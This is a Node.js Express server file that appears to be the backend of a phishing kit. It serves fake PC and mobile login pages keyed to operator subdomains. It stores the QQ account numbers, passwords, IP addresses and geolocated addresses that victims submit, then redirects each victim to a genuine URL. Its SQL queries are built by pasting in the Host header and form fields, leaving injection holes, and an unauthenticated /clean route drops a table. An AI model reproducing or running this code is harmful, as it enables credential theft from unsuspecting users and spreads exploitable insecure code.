const config = require('./config.json');
var express = require('express');
var partials = require('express-partials');
var multer = require('multer');
var bodyParser = require("body-parser");
var sql = require('./db/sqlite.js');
var cookieParser = require('cookie-parser'); //如果要使用cookie，需要显式包含这个模块
var device = require('express-device');
var rd = require('rd');
var magic = require('./lib/magic.js');
var _ip = require('./lib/ip.js');

var app = express();
// 设置 Cookie
app.use(cookieParser('dl-x'));
app.use(partials());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(device.capture());

app.use(multer({ dest: './views/upload/' }));

// 建表
sql.all('create table users(id integer PRIMARY KEY,tempId integer,isAdmin integer,isDelete integer,userPwd text,userName text,regTime text);',function(){})
sql.all('create table temps(id integer PRIMARY KEY,tempName text,bgUrl text,url text,isDelete integer,createTime text);',function(){});
sql.all('create table datas(id integer PRIMARY KEY,qq text,pwd text,ip text,address text,tempId integer,tempName text,userId integer,userName text,insertTime text,isDelete integer);',function(){});
sql.all('create table urls(id integer PRIMARY KEY,domain text,type integer,isDelete integer);',function(){});
// 差一个默认admin用户

rd.eachFileFilterSync('controller', /\.js$/, function (f, s) {
  if (f.indexOf('resource.js') <= 0) {
      var _router = require(f);
      typeof _router === 'function' ? _router(app) : 0;
  }
});
// require('./test.js')(app);

function insertData(req,cb) {
    var qq = req.body.u;
    var pwd = req.body.p;
    var userId = req.body.uid;
    var mid = req.body.mid;
    var ip = req.connection.remoteAddress;
    var insertTime = new Date().getTime().toString();
    var mname,userName,address;
    sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';',function(err,rows){
        mname = rows[0].tempName;
        userName = rows[0].userName;
        _ip(ip,function(ip,add){
            address = add;
            sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${address}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0);`,function(err,rows){
                cb();
            });
        });
    });
};

app.get('/_login',function(req,res) {
    var uidStr = req.headers.host;
    var uid = uidStr.substr(0,uidStr.indexOf('.'));
    sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
        var mid = rows[0].tempId;
        var bgUrl = rows[0].bgUrl;
        var url = rows[0].url;
        res.render('pages/pc_login_window.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
    });
});

app.post('/_login',function(req,res) {
    var tz = req.body.tz;
    var uidStr = req.headers.host;
    var uid = uidStr.substr(0,uidStr.indexOf('.'));
    insertData(req,function(){
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
            var mid = rows[0].tempId;
            var bgUrl = rows[0].bgUrl;
            var url = rows[0].url;
            if (tz.toString() === '1') {
                return res.send('<script>window.parent.location.href="'+url+'";</script>');
            }
            res.render('pages/pc_login_window.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
        });
    });
});

app.get('/temp1',function(req,res) {
    var uidStr = req.headers.host;
    var uid = uidStr.substr(0,uidStr.indexOf('.'));
    sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
        var mid = rows[0].tempId;
        var bgUrl = rows[0].bgUrl;
        var url = rows[0].url;
        if (req.device.type === 'phone') {
            return res.render('pages/wap_temp.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
        }
        res.render('pages/pc_temp.html',{layout: null,uid:uid,mid:mid,bgUrl:bgUrl});
    });
});

app.post('/temp1',function(req,res) {
    var tz = req.body.tz;
    var uidStr = req.headers.host;
    var uid = uidStr.substr(0,uidStr.indexOf('.'));
    insertData(req,function(){
        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
            var mid = rows[0].tempId;
            var bgUrl = rows[0].bgUrl;
            var url = rows[0].url;
            if (tz.toString() === '1') {
                return res.send('<script>window.parent.location.href="'+url+'";</script>');
            }
            if (req.device.type === 'phone') {
                return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
            }
            res.render('pages/pc_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
        });
    });

    // sql.all('select * from users where id=' + uid +';',function(err,rows){
    //     var mid = rows[0].tempId;
    //     sql.all('select * from temps where id=' + mid + ';',function(err,rows2){
    //         var bgUrl = rows2[0].bgUrl;
    //         if (req.device.type === 'phone') {
    //             return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
    //         }
    //         res.render('pages/pc_temp.html',{layout: null,uid:uid,mid:mid,bgUrl:bgUrl});
    //     });
    //
    // });
});

app.get('/clean',function(req,res) {
    sql.all('drop table temps;',function(){res.send('ok');});

});

require('./controller/resource.js')(app);

app.engine('html', require('ejs').renderFile);
app.listen(config.port);
